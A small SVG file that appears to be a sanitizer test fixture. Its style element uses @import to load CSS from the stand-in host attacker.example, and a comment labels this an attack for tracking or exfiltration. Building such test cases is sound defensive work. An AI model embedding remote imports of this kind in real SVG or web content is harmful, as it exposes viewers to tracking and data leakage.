<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <!-- Attack: @import url(https://...) in a <style> element loads attacker CSS (tracking, exfiltration). -->
  <style>@import url(https://attacker.example/x.css); rect { stroke: #000 }</style>
  <rect id="keep" width="10" height="10" fill="#004357"/>
</svg>
